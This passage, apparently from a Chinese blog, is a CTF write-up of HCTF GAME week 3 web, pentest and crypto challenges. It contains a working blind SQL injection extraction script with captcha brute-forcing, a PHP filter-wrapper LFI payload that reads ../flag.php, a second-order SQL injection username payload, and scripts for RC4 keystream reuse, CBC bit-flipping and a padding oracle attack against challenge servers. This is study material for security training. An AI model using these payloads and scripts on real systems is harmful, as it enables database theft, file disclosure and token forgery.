<span class="string">"'#"</span></span><br><span class="line">columnNumber = getData(payload)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'  [*] Column number is '</span> + columnNumber</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(int(columnNumber)):</span><br><span class="line">columnName = <span class="string">''</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'  [*] Column name '</span> + str(i) + <span class="string">': '</span>,</span><br><span class="line">payload = <span class="string">"-1 UNION SELECT length(column_name),'user' FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='"</span> + table + <span class="string">"' LIMIT "</span> + str(i) +<span class="string">",1#"</span></span><br><span class="line">columnLen = getData(payload)</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(int(columnLen)):</span><br><span class="line">payload = <span class="string">"-1 UNION SELECT ascii(substring(column_name,"</span> + str(j+<span class="number">1</span>) + <span class="string">",1)),'user' FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='"</span> + table + <span class="string">"' LIMIT "</span> + str(i) +<span class="string">",1#"</span></span><br><span class="line">ch = getData(payload)</span><br><span class="line">columnName += chr(int(ch))</span><br><span class="line"><span class="keyword">print</span> columnName</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getFlag</span><span class="params">()</span>:</span></span><br><span class="line">payload = <span class="string">"-1 UNION SELECT length(flag),'user' FROM hhhhhhctf#"</span></span><br><span class="line">flagLen = getData(payload)</span><br><span class="line"><span class="keyword">print</span> flagLen</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(int(flagLen)):</span><br><span class="line">payload = <span class="string">"-1 UNION SELECT ascii(substring(flag,"</span> + str(i+<span class="number">1</span>) + <span class="string">",1)),'user' FROM hhhhhhctf#"</span></span><br><span class="line">ch = getData(payload)</span><br><span class="line">flag += chr(int(ch))</span><br><span class="line"><span class="keyword">print</span> flag</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[*] The flag is: '</span> + flag</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getData</span><span class="params">(payload)</span>:</span></span><br><span class="line">r = requests.get(url, headers=headers)</span><br><span class="line">md5 = r.text.split(<span class="string">'==\''</span>)[<span class="number">1</span>][<span class="number">0</span>:<span class="number">4</span>]</span><br><span class="line">code = blasting(md5)</span><br><span class="line">data = &#123;<span class="string">'id'</span>:payload,<span class="string">'code'</span>:code&#125;</span><br><span class="line">r = requests.post(url, data=data, headers=headers)</span><br><span class="line"><span class="keyword">return</span> re.search(pat,r.text).group(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">blasting</span><span class="params">(code)</span>:</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000000</span>):</span><br><span class="line">md5 = hashlib.md5(str(i)).hexdigest()[<span class="number">0</span>:<span class="number">4</span>]</span><br><span class="line"><span class="keyword">if</span> md5 == code:</span><br><span class="line"><span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line"><span class="comment"># getDatabase()</span></span><br><span class="line"><span class="comment"># getTables()</span></span><br><span class="line"><span class="comment"># getFlag()</span></span><br><span class="line"><span class="keyword">print</span> blasting(<span class="string">'52c8'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure></p><p>PS: 看你们提交的 wp，都是在一位位的爆破，233</p><h3 id="从0开始LFI之2"><a href="#从0开始LFI之2" class="headerlink" title="从0开始LFI之2"></a>从0开始LFI之2</h3><blockquote><p>题目描述： flag还在../flag.php下，不信你还能拿到 (╯‵□′)╯︵┻━┻<br><a href="http://119.29.138.57:12002/" target="_blank" rel="external">http://119.29.138.57:12002/</a></p></blockquote><p>虽然很多人直接搜到了 payload，还是说下正常解题的思路吧</p><p>打开后首先发现参数名是 img，之前一直是 file(这也算提示了吧)，测试了下就会发现参数必须包含 jpg，否则会出现<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">File not found.</span><br></pre></td></tr></table></figure></p><p>尝试使用 php 伪协议来读取源码，既然有 jpg 的限制，那我们先读下它<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">img=php://filter/convert.base64-encode/resource=1.jpg</span><br></pre></td></tr></table></figure></p><p>结果发现仍然返回的是一张图片，这就很奇怪了，不应该返回的是 base64 编码吗，猜测是有什么过滤导致最后还是<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">'1.jpg'</span>)</span><br></pre></td></tr></table></figure></p><p>我觉得这里应该是要猜出题者的意图吧，既然你想用 php 伪协议读到源码，那我匹配下，仍然包含后面的不行了，结合对 1.jpg 的测试猜测大致的匹配是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter.*resource=(.*)</span><br></pre></td></tr></table></figure></p><p>根据匹配，然后提交<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">img=php://filter/jpg/resource=../flag.php</span><br></pre></td></tr></table></figure></p><p>结果仍然提示 <code>File not found.</code>，说明还有我们没想到的过滤，出题人如果也想到了你会这样做呢，他可能会做出一些过滤来让 resource 后面得是 jpg，而不是 php 什么的，大致有这么个匹配<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">resource/.*jpg</span><br></pre></td></tr></table></figure></p><p>如果参数中有 resource 的话，必须匹配上面才行</p><p>整理下现在得到的分析下，要拿到 flag，必须有 <code>resource=../flag.php</code>，还必须有 <code>resource=jpg</code>，这里就是利用了 php 正则匹配的最大贪婪原则，如果我们这样构造<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">img=php://filter/resource=jpg/resource=../flag.php</span><br></pre></td></tr></table></figure></p><p>php 的正则在匹配到 <code>resource=jpg</code> 的时候并没有停下，而是继续向前，直到匹配不到，就返回原来的匹配，如名，返回的是最大长度的匹配</p><p>PS: 当然这都是我 yy 的，忘了哪个 CTF 的题了，我觉得出题者差不多是这么想的吧(逃</p><h2 id="PENTEST"><a href="#PENTEST" class="headerlink" title="PENTEST"></a>PENTEST</h2><h3 id="LoRexxar的渗透之战之一"><a href="#LoRexxar的渗透之战之一" class="headerlink" title="LoRexxar的渗透之战之一"></a>LoRexxar的渗透之战之一</h3><blockquote><p>题目描述： 从这个题目开始将会是一个大型的渗透系列题目，前面遇到的web漏洞将会以不同的方式出现在题目中，你能抓住那些漏洞吗?<br>1、这个站才刚刚开始写，好像还什么都没有啊&gt;x&lt;<br><a href="http://115.28.78.16:13333/d23fd789868fa2c8b3942a811f63adb7/0x01/" target="_blank" rel="external">http://115.28.78.16:13333/d23fd789868fa2c8b3942a811f63adb7/0x01/</a></p></blockquote><p>打开发现，只有一个简单的注册登录功能，还有一个发送验证码的功能，然后抓了个包，发现验证码在源码里，提交并登录，就拿到 flag 了……</p><p>问了下出题人，是这样一种情景。当一个网站在还没有写完，测试的时候还要登录，所以把验证码输出在了源码里</p><h3 id="flag售货机"><a href="#flag售货机" class="headerlink" title="flag售货机"></a>flag售货机</h3><blockquote><p>题目描述： <a href="http://115.28.78.16:13333/b5062b7c25276283ed5f8a5e9026b762/" target="_blank" rel="external">http://115.28.78.16:13333/b5062b7c25276283ed5f8a5e9026b762/</a><br>欢迎来到flag售货机</p></blockquote><p>扫了下，发现 .git 目录存在，于是用 <a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="external">dvcs-ripper</a> 拿到源码，主要有这几个文件，也是大致的流程<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">register.php 注册</span><br><span class="line">login.php 登录</span><br><span class="line">user.php 用户界面</span><br><span class="line">recharge.php 增加金额</span><br><span class="line">buy.php 购买 flag</span><br></pre></td></tr></table></figure></p><p>整个代码写的还是挺清晰的，用户只能增加一次金额，但不够买 flag 的，看下 recharge.php，是通过用户增加金额后就从 volume 表中删除记录，所以不能再次购买了</p><p>注册和登录时都进行了转义，没什么问题，问题在于 recharge.php 对从数据库中取出来的数据进行了使用，你没觉得第3行查询时用的是 <code>$user</code>，到了第7行却用的是 <code>$req[&#39;username&#39;]</code> 很奇怪吗<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$user = $_SESSION[<span class="string">'user'</span>];</span><br><span class="line"></span><br><span class="line">$query = <span class="string">"select * from users where username = '&#123;$user&#125;'"</span>;</span><br><span class="line">$result = $db-&gt;query($query);</span><br><span class="line">$num_results = $result-&gt;num_rows;</span><br><span class="line">$req = $result-&gt;fetch_assoc();</span><br><span class="line"></span><br><span class="line">$query = <span class="string">"select * from volumes where username = '&#123;$req['username']&#125;'"</span>;</span><br><span class="line">$result = $db-&gt;query($query);</span><br><span class="line">var_dump($result);</span><br><span class="line">$num_results = $result-&gt;num_rows;</span><br><span class="line">var_dump($num_results);</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">$query = <span class="string">"UPDATE `users` SET `balance` = `balance` + 2000000 WHERE id = &#123;$req['id']&#125;"</span>;</span><br><span class="line">$result = $db-&gt;query($query);</span><br><span class="line"></span><br><span class="line">$query = <span class="string">"DELETE FROM `volumes` WHERE username = '&#123;$req['username']&#125;'"</span>;</span><br><span class="line">$result = $db-&gt;query($query);</span><br></pre></td></tr></table></figure></p><p>这里的知识点是二次注入，虽然注册时进行了过滤，但入库时是危险的数据，出库时也是危险的数据 </p><p>本地数据库操作下就知道了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; insert into test values(1,1,&apos;\&apos;&apos;);</span><br><span class="line">mysql&gt; select * from users;</span><br><span class="line"></span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | 1        | &apos;        |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></p><p>虽然插入的时候是转义的，存储的时候是没有反斜杠的，所以从数据库取出来数据的时候如果不进行转义等操作，就会造成二次注入</p><p>所以只要构造 payload 让 select 执行，delete 不执行就可以了<br>这就是有趣的地方了，只有 select 支持联合查询，所以当我们构造用户名为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#125;&apos; union select 1,2#</span><br></pre></td></tr></table></figure></p><p>select 成功执行了，但是 delete 因为不支持 union 操作，所以报错，不执行</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><p><del>节后综合征，不想写了，明天再写吧(逃</del></p><h3 id="explorer的奇怪番外3"><a href="#explorer的奇怪番外3" class="headerlink" title="explorer的奇怪番外3"></a>explorer的奇怪番外3</h3><blockquote><p>题目描述： <a href="http://121.42.25.113/Feistel/Feistel.html" target="_blank" rel="external">http://121.42.25.113/Feistel/Feistel.html</a></p></blockquote><p>Feisitel 网络，相应的写个解密函数就可以了<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(a,b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join([chr(ord(i)^ord(j)) <span class="keyword">for</span> i,j <span class="keyword">in</span> zip(a,b)])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">HASH</span><span class="params">(data)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> sha256(data).digest()[:<span class="number">8</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bes_encrypt</span><span class="params">(subkeys, data)</span>:</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    d1 = data[:<span class="number">8</span>]</span><br><span class="line">    d2 = data[<span class="number">8</span>:]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> subkeys:</span><br><span class="line">       d1 = xor(xor(HASH(d2),i),d1)</span><br><span class="line">       d1,d2 = d2,d1</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> d2 + d1</span><br><span class="line"></span><br><span class="line">d2 = <span class="string">"1fde6a7b2ff15d0a"</span>.decode(<span class="string">'hex'</span>)   </span><br><span class="line">d1 = <span class="string">"bad691215ca5d470"</span>.decode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bes_decrypt</span><span class="params">(d2,d1)</span>:</span></span><br><span class="line">subKeys = key_schedule(<span class="string">'explorer'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">15</span>,<span class="number">-1</span>,<span class="number">-1</span>):</span><br><span class="line">d1,d2 = d2,d1</span><br><span class="line">d1 = xor(xor(d1,subKeys[i]),HASH(d2))</span><br><span class="line"><span class="keyword">print</span> d2</span><br><span class="line"><span class="keyword">print</span> d1</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">key_schedule</span><span class="params">(key)</span>:</span></span><br><span class="line">    subKeys = []</span><br><span class="line">    subKey = key</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">16</span>):</span><br><span class="line">        subKey = HASH(subKey)</span><br><span class="line">        subKeys.append(subKey)</span><br><span class="line">    <span class="keyword">return</span> subKeys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bes</span><span class="params">(key,data)</span>:</span></span><br><span class="line">    subKeys = key_schedule(key)</span><br><span class="line">    <span class="keyword">return</span> bes_encrypt(subKeys, data).encode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1fde6a7b2ff15d0a bad691215ca5d470</span></span><br><span class="line"><span class="comment"># the result  is "1fde6a7b2ff15d0abad691215ca5d470"</span></span><br><span class="line"><span class="comment"># if __name__ == "__main__":</span></span><br><span class="line"><span class="comment">#     bes('explorer','??flag_is_here??')</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print key_schedule('explorer')</span></span><br><span class="line">bes_decrypt(d2,d1)</span><br></pre></td></tr></table></figure></p><h3 id="进击的-Crypto-1"><a href="#进击的-Crypto-1" class="headerlink" title="进击的 Crypto [1]"></a>进击的 Crypto [1]</h3><blockquote><p>题目描述： 让我们来玩点有趣的东西 :)<br><a href="http://119.29.138.57:23333/crypto/encode_system/" target="_blank" rel="external">http://119.29.138.57:23333/crypto/encode_system/</a></p></blockquote><p>题目思路来源于 HCTF 2014 中的 <a href="https://github.com/hduisa/hctf2015-all-problems/tree/master/server%20is%20done" target="_blank" rel="external">server is done</a> 题目<br>题目是采用的 RC4 算法来产生密钥流，然后对用户的输入进行加密，其中 flag 也被相同的密钥进行了加密，密文在源码中，有个小坑是 flag 的密文是没经任何处理直接输出的，包含的不可显字符就不能直接复制下来了，这里我是通过写了个 Python 脚本来获取的。</p><p>因为我们不知道密钥是多少位的，直接传入很长的明文，这样我们有了明文1，密文1，密文2，就能知道明文2的内容了，贴上个以前写的 PHP 的代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 明文、密文、密钥长度一样</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    流密码加密</span></span><br><span class="line"><span class="comment">    E(A) = A xor C</span></span><br><span class="line"><span class="comment">    E(B) = B xor C</span></span><br><span class="line"><span class="comment">    E(A) xor E(B) = (A xor C) xor (B xor C) = A xor B </span></span><br><span class="line"><span class="comment">    E(A) xor A = A xor C xor A = C</span></span><br><span class="line"><span class="comment">    E(B) xor C = B xor C xor C = B</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">$message  = <span class="string">"3131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131"</span>;</span><br><span class="line">$cipher   = <span class="string">"66706d04437b15455e4503464f50714d5e066a1d765873527340706b5e6d03556d1054064a01576660677d067451696a467154426c40146146475c62470e59641c1d4051720e0f187e026f4c411f0509767b5744656d4552746b7a66446d1558525c1f1863430f585a0264670c55045e72675d4d55714159715074474b511906"</span>;</span><br><span class="line">$message2 = <span class="string">""</span>;</span><br><span class="line">$cipher2  = <span class="string">"2f1433790f73490d1215180f354f2337560f22646b096326265d3d1b573a40311012321e281d1c3f75267d5211273e2b2928354d65150b15071d0417441530096a1c4e1e21067343206c39061c1f071e78180145183d03512f2d7a6b5007000c40597f483a1a5d1d0d48073f4b01001b1c155d0c0c250237743e74052505524a"</span>;</span><br><span class="line">$key      = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// pack()函数 把一定格式的数据装入一个二进制字符串   H 16进制格式</span></span><br><span class="line"><span class="comment">// bin2hex()函数 把二进制字符串转换成16进制字符串</span></span><br><span class="line">$key = bin2hex(pack(<span class="string">'H*'</span>,$cipher) ^ pack(<span class="string">'H*'</span>,$message));</span><br><span class="line">$message2 = bin2hex(pack(<span class="string">'H*'</span>,$cipher2) ^ pack(<span class="string">'H*'</span>,$key));</span><br><span class="line"><span class="keyword">echo</span> $message2;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><h3 id="explorer的奇怪番外5"><a href="#explorer的奇怪番外5" class="headerlink" title="explorer的奇怪番外5"></a>explorer的奇怪番外5</h3><blockquote><p>题目描述： <a href="http://121.42.25.113/crypto1/crypto1.html" target="_blank" rel="external">http://121.42.25.113/crypto1/crypto1.html</a></p></blockquote><p>cbc byte flipping attack(cbc 字节翻转攻击)，核心是利用异或<br>题目要求输入一段 token，aes 解密后明文是 <code>admin:alvndasjnc</code>。提供了注册功能，但是不能直接输入明文，如果我们改变明文的第一个字母为 b，通过下面的异或操作就能得到原明文对应的 token，假设中间值为 mid，a 对应的密文部分为 aa，b 对应的密文部分为 bb<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&apos;b&apos; xor mid = bb</span><br><span class="line">&apos;b&apos; xor mid xor &apos;b&apos; xor &apos;a&apos; = aa</span><br></pre></td></tr></table></figure></p><p>对于这道题来说则是，注册 <code>bdmin:alvndasjnc</code>，得到 token 值 <font color="red">8e</font>b9e846f62c5036a8bfa2bd3f6ff9c65d7b15e6eb0494081a7f1c74e9cc4e37a7585b5a9d17d775291595adaa12701c，更改 IV 的首字节<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x8e xor 0x62 xor 0x61 = 0x8d</span><br></pre></td></tr></table></figure></p><p>提交 <font color="red">8d</font>b9e846f62c5036a8bfa2bd3f6ff9c65d7b15e6eb0494081a7f1c74e9cc4e37a7585b5a9d17d775291595adaa12701c，得到 flag</p><h3 id="explorer的奇怪番外6"><a href="#explorer的奇怪番外6" class="headerlink" title="explorer的奇怪番外6"></a>explorer的奇怪番外6</h3><blockquote><p>题目描述： <a href="http://121.42.25.113/crypto2/crypto2.html" target="_blank" rel="external">http://121.42.25.113/crypto2/crypto2.html</a></p></blockquote><p>题目已经说了是 padding oracle attack，网上关于这种攻击的资料很多，原理不再叙述</p><p>因为网上大多是 Web 应用中的已知密文的攻击，而这道题是已知明文的攻击。不过大同小异。</p><p><img src="http://heartsky.info/images/image/HCTF_GAME_week3_wp_1.png" alt="HCTF_GAME_week3_wp_1.png"><br>如果我们先随便选取一段密文，根据这种攻击的思想跑出相应的 IV，但是问题在于此时的明文不一定是我们想要的。我们知道 AES 解密后的中间值(即上图中的 Intermidiary Value)是不变的，对于同一段密文和 key 来说。假设我们之前跑出来的明文及 IV 分别为 m1、IV1，要求的明文及 IV 为 m2、IV2<br>\begin{matrix} m1\ xor\ IV1 = Intermidiary\ Value \\<br>m2\ xor\ IV2 = Intermidiary\ Value \\<br>IV2 = Intermidiary\ Value\ xor\ m2 \end{matrix}<br>也就是说我们用跑出来的 Intermidiary Value 和 想要的明文进行异或，就得得到符合要求的 IV，然后我们从最后一组 token 往前跑，因为这样就可以异或得到的 IV 作为前一组的密文</p><p>脚本写的复杂了些，不过应该比较好理解<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">host = <span class="string">'121.42.25.113'</span></span><br><span class="line">port = <span class="number">20003</span></span><br><span class="line">sk = socket.socket()</span><br><span class="line">sk.connect((host,port))</span><br><span class="line">time.sleep(<span class="number">0.5</span>)</span><br><span class="line">mes = sk.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">msg1 = <span class="string">'admin:alvndasjnc'</span>.encode(<span class="string">'hex'</span>)</span><br><span class="line">msg2 = <span class="string">'akslbdvlaksdn'</span>.encode(<span class="string">'hex'</span>) + <span class="string">'03'</span> * <span class="number">3</span></span><br><span class="line">intermediary = list(<span class="string">'-'</span> * <span class="number">32</span>)</span><br><span class="line">IV = <span class="string">'0'</span> * <span class="number">32</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendData</span><span class="params">(IV, c)</span>:</span></span><br><span class="line">    IV = <span class="string">''</span>.join(IV)</span><br><span class="line">    sk.sendall(<span class="string">'1\n'</span>)</span><br><span class="line">    sk.recv(<span class="number">1024</span>)</span><br><span class="line">    sk.sendall(IV + c + <span class="string">'\n'</span>)</span><br><span class="line">    time.sleep(<span class="number">0.01</span>)</span><br><span class="line">    mes = sk.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="keyword">return</span> mes</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">changeIV</span><span class="params">(IV, num)</span>:</span></span><br><span class="line">    tmp = (<span class="number">32</span> - num)/<span class="number">2</span></span><br><span class="line">    nextPad = tmp + <span class="number">1</span></span><br><span class="line">    <span class="keyword">print</span> str(num + <span class="number">1</span>).zfill(<span class="number">2</span>) + <span class="string">'-'</span> + str(num + <span class="number">2</span>).zfill(<span class="number">2</span>) + <span class="string">': '</span>,</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,tmp + <span class="number">1</span>):</span><br><span class="line">        tmp2 = <span class="number">32</span> - <span class="number">2</span> * i</span><br><span class="line">        IV[tmp2:tmp2+<span class="number">2</span>] = hex(int(<span class="string">''</span>.join(IV[tmp2:tmp2+<span class="number">2</span>]),<span class="number">16</span>) ^ tmp ^ nextPad)[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(IV)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">changeMessageIV</span><span class="params">(IV, m)</span>:</span></span><br><span class="line">    num = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>,<span class="number">-1</span>,<span class="number">-2</span>):</span><br><span class="line">        IV[i:i+<span class="number">2</span>] = hex(int(<span class="string">''</span>.join(IV[i:i+<span class="number">2</span>]),<span class="number">16</span>) ^ <span class="number">17</span> ^ int(<span class="string">''</span>.join(m[i:i+<span class="number">2</span>]),<span class="number">16</span>))[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line">        num += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(IV)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(m, c)</span>:</span></span><br><span class="line">    IV = <span class="string">'0'</span> * <span class="number">32</span>   </span><br><span class="line">    num = <span class="number">30</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">if</span> num &lt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> changeMessageIV(list(IV), list(m))</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">            h = hex(i)[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line">            IV = list(IV)</span><br><span class="line">            IV[num:num+<span class="number">2</span>] = h</span><br><span class="line">            res = sendData(IV, c)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'decrypt error'</span> <span class="keyword">not</span> <span class="keyword">in</span> res:</span><br><span class="line">                IV = changeIV(IV, num)</span><br><span class="line">                <span class="keyword">print</span> IV</span><br><span class="line">                num -= <span class="number">2</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    c = <span class="string">'0'</span> * <span class="number">32</span></span><br><span class="line">    token2 = run(msg2,c)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'The token 2 is '</span> + token2</span><br><span class="line">    c = token2</span><br><span class="line">    token1 = run(msg1,c)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'The token 1 is '</span> + token1</span><br><span class="line">    <span class="keyword">print</span> sendData(token1,token2 + <span class="string">'0'</span>*<span 